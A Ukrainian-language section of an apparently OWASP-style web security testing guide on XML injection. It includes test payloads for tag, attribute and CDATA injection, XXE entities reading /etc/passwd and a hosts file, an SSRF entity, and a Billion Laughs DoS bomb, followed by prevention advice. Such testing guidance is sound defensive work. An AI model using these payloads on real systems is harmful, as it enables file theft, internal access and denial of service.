# 4.7.7 Тестування на XML-ін'єкції

## Резюме

XML-ін'єкція відбувається, коли веб-додаток створює XML-документи з даних користувача без належної валідації або екранування. Атакуючий може маніпулювати XML-структурою для зміни логіки додатку або отримання несанкціонованого доступу до даних.

## Цілі тестування

- Ідентифікувати точки XML-ін'єкцій
- Оцінити вплив можливих XML-ін'єкцій на безпеку додатку

## Як тестувати

### Типи XML-ін'єкцій

#### 1. Ін'єкція в XML-тегах

Якщо додаток формує XML таким чином:
```xml
<user>
  <username>USER_INPUT</username>
  <password>PASS_INPUT</password>
</user>
```

**Тестові дані:**
- Ім'я користувача: `admin</username><role>administrator</role><username>test`

Результат:
```xml
<user>
  <username>admin</username>
  <role>administrator</role>
  <username>test</username>
  <password>PASS_INPUT</password>
</user>
```

#### 2. Ін'єкція в CDATA секції

Якщо використовуються CDATA секції:
```xml
<comment><![CDATA[USER_INPUT]]></comment>
```

**Тестові дані:**
- `]]><script>alert('XSS')</script><![CDATA[`

#### 3. Ін'єкція в XML-атрибутах

```xml
<user name="USER_INPUT" />
```

**Тестові дані:**
- `admin" role="administrator`

Результат:
```xml
<user name="admin" role="administrator" />
```

### XXE (XML External Entity) атаки

XXE - особливо небезпечний тип XML-ін'єкції:

```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <username>&xxe;</username>
</user>
```

**Варіанти XXE атак:**
1. **Читання локальних файлів:**
   ```xml
   <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
   ```

2. **SSRF (Server-Side Request Forgery):**
   ```xml
   <!ENTITY xxe SYSTEM "http://internal-server/admin">
   ```

3. **Billion Laughs Attack (DoS):**
   ```xml
   <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
   ]>
   <lolz>&lol3;</lolz>
   ```

### Методологія тестування

1. **Ідентифікація точок введення:**
   - Форми, що приймають XML
   - SOAP веб-сервіси
   - REST API з XML payload
   - Завантаження XML-файлів

2. **Базові тести:**
   - Спеціальні XML-символи: `< > & ' "`
   - Некоректні XML-структури
   - XML-бомби для тестування DoS

3. **Розширені тести:**
   - XXE з різними протоколами (file://, http://, ftp://)
   - Blind XXE через out-of-band канали
   - XInclude атаки

### Тестування сірої скриньки

При аналізі коду шукайте:

1. **Небезпечні парсери:**
   - Парсери з увімкненим DTD
   - Парсери без обмежень на зовнішні сутності

2. **Відсутність валідації:**
   - Пряма конкатенація користувацьких даних в XML
   - Відсутність екранування спеціальних символів

## Інструменти

- **XXEinjector** - автоматизований інструмент для XXE
- **OWASP ZAP** - має модулі для тестування XXE
- **Burp Suite** - розширення для XXE тестування
- **XMLLint** - для валідації та тестування XML

## Запобігання

1. **Відключення зовнішніх сутностей:**
   ```java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Валідація та екранування:**
   - Використовуйте XML Schema для валідації
   - Екрануйте спеціальні символи:
     ```
     < -> &lt;
     > -> &gt;
     & -> &amp;
     ' -> &apos;
     " -> &quot;
     ```

3. **Використання безпечних парсерів**
4. **Принцип найменших привілеїв для процесів парсингу**
5. **Моніторинг аномальної XML-активності**

## Посилання

- [OWASP XML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CWE-91: XML Injection](https://cwe.mitre.org/data/definitions/91.html)